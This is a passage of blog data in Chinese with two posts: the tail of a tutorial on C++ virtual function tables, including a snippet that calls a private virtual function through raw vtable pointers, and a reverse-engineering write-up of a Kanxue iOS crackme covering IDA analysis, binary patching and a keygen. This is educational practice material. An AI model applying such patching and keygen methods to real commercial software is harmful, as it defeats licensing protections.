注意：在上面这个图中，我在虚函数表的最后多加了一个结点，这是虚函数表的结束结点，就像字符串的结束符“\\0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。在WinXP+VS2003下，这个值是NULL。而在Ubuntu 7.10 + Linux 2.6.22 + GCC 4.1.3下，这个值是如果1，表示还有下一个虚函数表，如果值是0，表示是最后一个虚函数表。 下面，我将分别说明“无覆盖”和“有覆盖”时的虚函数表的样子。没有覆盖父类的虚函数是毫无意义的。我之所以要讲述没有覆盖的情况，主要目的是为了给一个对比。在比较之下，我们可以更加清楚地知道其内部的具体实现。 一般继承（无虚函数覆盖）下面，再让我们来看看继承时的虚函数表是什么样的。假设有如下所示的一个继承关系： 请注意，在这个继承关系中，子类没有重载任何父类的函数。那么，在派生类的实例中，其虚函数表如下所示：对于实例：Derive d; 的虚函数表如下：我们可以看到下面几点： 虚函数按照其声明顺序放于表中。 父类的虚函数在子类的虚函数前面。我相信聪明的你一定可以参考前面的那个程序，来编写一段程序来验证。 一般继承（有虚函数覆盖）覆盖父类的虚函数是很显然的事情，不然，虚函数就变得毫无意义。下面，我们来看一下，如果子类中有虚函数重载了父类的虚函数，会是一个什么样子？假设，我们有下面这样的一个继承关系。 为了让大家看到被继承过后的效果，在这个类的设计中，我只覆盖了父类的一个函数：f()。那么，对于派生类的实例，其虚函数表会是下面的一个样子： 我们从表中可以看到下面几点， 覆盖的f()函数被放到了虚表中原来父类虚函数的位置。 没有被覆盖的函数依旧。这样，我们就可以看到对于下面这样的程序， Base *b = new Derive(); b-&gt;f(); 由b所指的内存中的虚函数表的f()的位置已经被Derive::f()函数地址所取代，于是在实际调用发生时，是Derive::f()被调用了。这就实现了多态。 多重继承（无虚函数覆盖）下面，再让我们来看看多重继承中的情况，假设有下面这样一个类的继承关系。注意：子类并没有覆盖父类的函数。 对于子类实例中的虚函数表，是下面这个样子： 我们可以看到： 每个父类都有自己的虚表。 子类的成员函数被放到了第一个父类的表中。（所谓的第一个父类是按照声明顺序来判断的） 这样做就是为了解决不同的父类类型的指针指向同一个子类实例，而能够调用到实际的函数。 多重继承（有虚函数覆盖） 下面我们再来看看，如果发生虚函数覆盖的情况。 下图中，我们在子类中覆盖了父类的f()函数。 下面是对于子类实例中的虚函数表的图： 我们可以看见，三个父类虚函数表中的f()的位置被替换成了子类的函数指针。这样，我们就可以任一静态类型的父类来指向子类，并调用子类的f()了。如： Derive d; Base1 *b1 = &amp;d; Base2 *b2 = &amp;d; Base3 *b3 = &amp;d; b1-&gt;f(); //Derive::f() b2-&gt;f(); //Derive::f() b3-&gt;f(); //Derive::f() b1-&gt;g(); //Base1::g() b2-&gt;g(); //Base2::g() b3-&gt;g(); //Base3::g() 安全性每次写C++的文章，总免不了要批判一下C++。这篇文章也不例外。通过上面的讲述，相信我们对虚函数表有一个比较细致的了解了。水可载舟，亦可覆舟。下面，让我们来看看我们可以用虚函数表来干点什么坏事吧。 一、通过父类型的指针访问子类自己的虚函数我们知道，子类没有重载父类的虚函数是一件毫无意义的事情。因为多态也是要基于函数重载的。虽然在上面的图中我们可以看到Base1的虚表中有Derive的虚函数，但我们根本不可能使用下面的语句来调用子类的自有虚函数： Base1 *b1 = new Derive(); b1-&gt;f1(); //编译出错 任何妄图使用父类指针想调用子类中的未覆盖父类的成员函数的行为都会被编译器视为非法，所以，这样的程序根本无法编译通过。但在运行时，我们可以通过指针的方式访问虚函数表来达到违反C++语义的行为。（关于这方面的尝试，通过阅读后面附录的代码，相信你可以做到这一点） 二、访问non-public的虚函数另外，如果父类的虚函数是private或是protected的，但这些非public的虚函数同样会存在于虚函数表中，所以，我们同样可以使用访问虚函数表的方式来访问这些non-public的虚函数，这是很容易做到的。 如： class Base { private: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } }; class Derive : public Base{ }; typedef void(*Fun)(void); void main() { Derive d; Fun pFun = (Fun)*((int*)*(int*)(&amp;d)+0); pFun(); } 结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vtable/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"crackme","slug":"crackme","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"}]}]